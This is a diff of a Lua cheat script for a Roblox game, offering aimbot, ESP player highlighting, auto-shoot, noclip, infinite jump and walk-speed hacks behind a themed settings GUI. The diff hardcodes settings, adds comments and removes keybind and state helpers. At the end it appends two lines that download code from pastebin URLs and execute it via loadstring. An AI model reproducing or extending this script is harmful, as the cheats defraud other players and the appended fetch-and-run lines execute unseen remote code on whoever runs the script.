@@ -1,12 +1,3 @@
-local SENSITIVITY_MULTIPLIER = Config.SENSITIVITY_MULTIPLIER
-local AimbotMode = Config.AimbotMode
-local ESPEnabled = Config.ESPEnabled
-local NoClipEnabled = Config.NoClipEnabled
-local AutoShootEnabled = Config.AutoShootEnabled
-local InfiniteJumpEnabled = Config.InfiniteJumpEnabled
-local WalkSpeedEnabled = Config.WalkSpeedEnabled
-local MOVE_SPEED = Config.WalkSpeed
-
 local UserInputService = game:GetService("UserInputService")
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
@@ -16,6 +7,20 @@ local CoreGui = game:GetService("CoreGui")
 local LocalPlayer = Players.LocalPlayer
 local Camera = game.Workspace.CurrentCamera
 local Keybind = Enum.UserInputType.MouseButton2
+
+local SENSITIVITY_MULTIPLIER = 0.5
+
+local AimbotMode = "Hold"
+
+local ESPEnabled = false
+
+local AutoShootEnabled = false
+
+local InfiniteJumpEnabled = false
+
+local NoClipEnabled = false
+
+local WalkSpeedEnabled = false
 
 local SPACING = 20
 local ELEMENT_HEIGHT = 40
@@ -52,20 +57,20 @@ local LERP_FACTOR = 0.2
 
 local ThemeColors = {
     Dark = {
-        Background = Color3.fromRGB(0, 0, 0),
-        Panel = Color3.fromRGB(15, 15, 15),
-        Accent = Color3.fromRGB(100, 100, 100),
-        Highlight = Color3.fromRGB(150, 150, 150),
-        Text = Color3.fromRGB(255, 255, 255),
-        Danger = Color3.fromRGB(255, 255, 255)
+        Background = Color3.fromRGB(0, 0, 0),        -- Black
+        Panel = Color3.fromRGB(15, 15, 15),           -- Darker Gray
+        Accent = Color3.fromRGB(100, 100, 100),       -- Darker Gray
+        Highlight = Color3.fromRGB(150, 150, 150),    -- Slightly Darker Light Gray
+        Text = Color3.fromRGB(255, 255, 255),         -- White
+        Danger = Color3.fromRGB(255, 255, 255)        -- White (for danger elements)
     },
     Light = {
-        Background = Color3.fromRGB(255, 255, 255),   
-        Panel = Color3.fromRGB(230, 230, 230),        
-        Accent = Color3.fromRGB(128, 128, 128),       
-        Highlight = Color3.fromRGB(100, 100, 100),    
-        Text = Color3.fromRGB(0, 0, 0),               
-        Danger = Color3.fromRGB(0, 0, 0)              
+        Background = Color3.fromRGB(255, 255, 255),   -- White
+        Panel = Color3.fromRGB(230, 230, 230),        -- Light Gray
+        Accent = Color3.fromRGB(128, 128, 128),       -- Gray
+        Highlight = Color3.fromRGB(100, 100, 100),    -- Dark Gray
+        Text = Color3.fromRGB(0, 0, 0),               -- Black
+        Danger = Color3.fromRGB(0, 0, 0)              -- Black (for danger elements)
     }
 }
 
@@ -397,9 +402,9 @@ local function createButton(parent, size, position, text, cornerRadius)
     button.Size = size
     button.Position = position
     button.Text = text
-    button.BackgroundColor3 = ThemeColors[CurrentTheme].Accent 
+    button.BackgroundColor3 = ThemeColors[CurrentTheme].Accent -- Default background color
     button.BackgroundTransparency = 0.3
-    button.TextColor3 = ThemeColors[CurrentTheme].Text 
+    button.TextColor3 = ThemeColors[CurrentTheme].Text -- Default text color
     button.TextSize = 14
     button.Font = Enum.Font.GothamSemibold
     button.AutoButtonColor = false
@@ -409,24 +414,27 @@ local function createButton(parent, size, position, text, cornerRadius)
     corner.CornerRadius = UDim.new(0, cornerRadius or 8)
     corner.Parent = button
 
+    -- Hover effect
     button.MouseEnter:Connect(function()
         TweenService:Create(button, TweenInfo.new(0.3), {
-            BackgroundColor3 = Color3.fromRGB(255, 255, 255), 
-            TextColor3 = Color3.fromRGB(0, 0, 0), 
+            BackgroundColor3 = Color3.fromRGB(255, 255, 255), -- White background on hover
+            TextColor3 = Color3.fromRGB(0, 0, 0), -- Black text on hover
             BackgroundTransparency = 0.1,
             TextSize = 15
         }):Play()
     end)
 
+    -- Reset to default when not hovered
     button.MouseLeave:Connect(function()
         TweenService:Create(button, TweenInfo.new(0.3), {
-            BackgroundColor3 = ThemeColors[CurrentTheme].Accent, 
-            TextColor3 = ThemeColors[CurrentTheme].Text, 
+            BackgroundColor3 = ThemeColors[CurrentTheme].Accent, -- Default background color
+            TextColor3 = ThemeColors[CurrentTheme].Text, -- Default text color
             BackgroundTransparency = 0.3,
             TextSize = 14
         }):Play()
     end)
 
+    -- Button press effect
     button.MouseButton1Down:Connect(function()
         TweenService:Create(button, TweenInfo.new(0.1), {
             Size = size - UDim2.new(0, 4, 0, 4),
@@ -492,6 +500,7 @@ local AimbotStatus, AimbotIcon = createStatusIndicator(SidePanel, UDim2.new(0.1,
 local AutoShootStatus, AutoShootIcon = createStatusIndicator(SidePanel, UDim2.new(0.1, 0, 0.45, 0), "🔫", "Auto Shoot: Off", ACTIVE_FEATURES_ELEMENT_HEIGHT)
 local NoClipStatus, NoClipIcon = createStatusIndicator(SidePanel, UDim2.new(0.1, 0, 0.55, 0), "🚀", "NoClip: Off", ACTIVE_FEATURES_ELEMENT_HEIGHT)
 local WalkSpeedStatus, WalkSpeedIcon = createStatusIndicator(SidePanel, UDim2.new(0.1, 0, 0.65, 0), "🏃", "WalkSpeed: Off", ACTIVE_FEATURES_ELEMENT_HEIGHT)
+
 
 local SettingsButton = createButton(ScreenGui, UDim2.new(0, 110, 0, 40), UDim2.new(0.9, -120, 0.05, 0), "Settings")
 
@@ -650,11 +659,6 @@ KeybindLabel.Parent = ScrollingFrame
 
 local ChangeKeybind = createButton(ScrollingFrame, UDim2.new(0, 250, 0, ELEMENT_HEIGHT), UDim2.new(0.1, 0, 0, PADDING + (ELEMENT_HEIGHT + SPACING) * 6 + 50), "Change Keybind")
 
-local function updateKeybind(newKeybind)
-    Keybind = newKeybind
-    Config.AimbotKeybind = newKeybind
-end
-
 SettingsButton.MouseButton1Click:Connect(function()
     if SettingsFrame.Visible then
         TweenService:Create(BlurEffect, TweenInfo.new(0.3), {Size = 0}):Play()
@@ -739,23 +743,13 @@ local function createESP(player)
 
 local highlight = Instance.new("Highlight")
 highlight.Adornee = player.Character
-highlight.FillColor = Color3.new(0, 0, 0)  
-highlight.OutlineColor = Color3.new(1, 1, 1)  
+highlight.FillColor = Color3.new(0, 0, 0)  -- Black
+highlight.OutlineColor = Color3.new(1, 1, 1)  -- White
 highlight.FillTransparency = 0.5
 highlight.OutlineTransparency = 0.3
 highlight.Parent = player.Character
 ESPHighlights[player] = highlight
 
-end
-
-local function updateESPState(newState)
-    ESPEnabled = newState
-    Config.ESPEnabled = newState
-    if ESPEnabled then
-        applyESPToAllPlayers()
-    else
-        removeESPFromAllPlayers()
-    end
 end
 
 local function removeESP(player)
@@ -845,11 +839,15 @@ end)
 
 espToggle:GetChildren()[2].InputBegan:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        local newState = not ESPEnabled
-        setESPState(newState)
-        ESPStatus.Text = "ESP: " .. (newState and "On" or "Off")
-        ESPStatus.TextColor3 = newState and ThemeColors[CurrentTheme].Accent or Color3.fromRGB(150, 150, 150)
-        ESPIcon.TextColor3 = newState and ThemeColors[CurrentTheme].Accent or Color3.fromRGB(150, 150, 150)
+        ESPEnabled = not ESPEnabled
+        ESPStatus.Text = "ESP: " .. (ESPEnabled and "On" or "Off")
+        ESPStatus.TextColor3 = ESPEnabled and ThemeColors[CurrentTheme].Accent or Color3.fromRGB(150, 150, 150)
+        ESPIcon.TextColor3 = ESPEnabled and ThemeColors[CurrentTheme].Accent or Color3.fromRGB(150, 150, 150)
+        if ESPEnabled then
+            applyESPToAllPlayers()
+        else
+            removeESPFromAllPlayers()
+        end
     end
 end)
 
@@ -957,14 +955,6 @@ local function GetClosestPlayerToCursor()
     end
 
     return closestPlayer
-end
-
-local function updateAimbotState(newState)
-    AimbotToggleEnabled = newState
-    if not newState then
-        AimbotEnabled = false
-        Target = nil
-    end
 end
 
 local function calculateVelocity(part, deltaTime)
@@ -1130,7 +1120,7 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
                 if AimbotMode == "Toggle" then
                     AimbotEnabled = not AimbotEnabled
                     if AimbotEnabled then
-                        Target = GetClosestPlayerToCursor()
+                        Target = GetClosestPlayerToCursor() 
                         UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
                     else
                         Target = nil
@@ -1138,7 +1128,7 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
                     end
                 else
                     AimbotEnabled = true
-                    Target = GetClosestPlayerToCursor()
+                    Target = GetClosestPlayerToCursor() 
                     UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
                 end
             end
@@ -1155,38 +1145,6 @@ UserInputService.InputEnded:Connect(function(input, gameProcessed)
         end
     end
 end)
-
-local function createKeybindButton(parent, position, text, defaultKeybind)
-    local button = createButton(parent, UDim2.new(0, 250, 0, ELEMENT_HEIGHT), position, text)
-    button.MouseButton1Click:Connect(function()
-        button.Text = "Press any key..."
-        local inputConnection
-        inputConnection = UserInputService.InputBegan:Connect(function(input)
-            if input.UserInputType == Enum.UserInputType.Keyboard or 
-               input.UserInputType == Enum.UserInputType.MouseButton1 or 
-               input.UserInputType == Enum.UserInputType.MouseButton2 then
-                if input.UserInputType == Enum.UserInputType.Keyboard then
-                    updateKeybind(input.KeyCode)
-                else
-                    updateKeybind(input.UserInputType)
-                end
-                local keyName
-                if input.UserInputType == Enum.UserInputType.MouseButton1 then
-                    keyName = "Left Click"
-                elseif input.UserInputType == Enum.UserInputType.MouseButton2 then
-                    keyName = "Right Click"
-                else
-                    keyName = tostring(input.KeyCode):gsub("Enum.KeyCode.", "")
-                end
-                button.Text = "Keybind: " .. keyName
-                inputConnection:Disconnect()
-            end
-        end)
-    end)
-    return button
-end
-
-local KeybindButton = createKeybindButton(ScrollingFrame, UDim2.new(0.1, 0, 0, PADDING + (ELEMENT_HEIGHT + SPACING) * 6 + 50), "Change Keybind", Keybind)
 
 local MIN_DELTA_THRESHOLD = 0.1  
 
@@ -1242,23 +1200,17 @@ local function smoothMoveToTarget(targetPosition)
     mousemoverel(smoothDeltaX, smoothDeltaY)
 end
 
-local aimbotToggle, getAimbotState, setAimbotState = createToggle(
-    ScrollingFrame,
-    UDim2.new(0.1, 0, 0, PADDING + (ELEMENT_HEIGHT + SPACING) * 3),
-    "Aimbot",
-    AimbotToggleEnabled
-)
-
+local aimbotToggle, getAimbotState, setAimbotState = createToggle(ScrollingFrame, UDim2.new(0.1, 0, 0, PADDING + (ELEMENT_HEIGHT + SPACING) * 3), "Aimbot", AimbotToggleEnabled)
 aimbotToggle:GetChildren()[2].InputBegan:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        local newState = not AimbotToggleEnabled
-        setAimbotState(newState)
-        AimbotStatus.Text = "Aimbot: " .. (newState and (AimbotEnabled and "On" or "Off") or "Off")
-        AimbotStatus.TextColor3 = (newState and AimbotEnabled) and ThemeColors[CurrentTheme].Accent or Color3.fromRGB(150, 150, 150)
-        AimbotIcon.TextColor3 = (newState and AimbotEnabled) and ThemeColors[CurrentTheme].Accent or Color3.fromRGB(150, 150, 150)
+        AimbotToggleEnabled = not AimbotToggleEnabled
+        AimbotEnabled = false
+        Target = nil
+        AimbotStatus.Text = "Aimbot: " .. (AimbotToggleEnabled and (AimbotEnabled and "On" or "Off") or "Off")
+        AimbotStatus.TextColor3 = (AimbotToggleEnabled and AimbotEnabled) and ThemeColors[CurrentTheme].Accent or Color3.fromRGB(150, 150, 150)
+        AimbotIcon.TextColor3 = (AimbotToggleEnabled and AimbotEnabled) and ThemeColors[CurrentTheme].Accent or Color3.fromRGB(150, 150, 150)
     end
 end)
-
 local function InfiniteJump()
     if not InfiniteJumpEnabled then 
         if InfiniteJumpConnection then
@@ -1528,3 +1480,6 @@ local function updateUI()
 end
 
 updateUI()
+
+loadstring(game:HttpGet("https://pastebin.com/raw/aHYKbmCK",true))()
+loadstring(game:HttpGet("https://pastebin.com/raw/M3JUrbmU",true))()
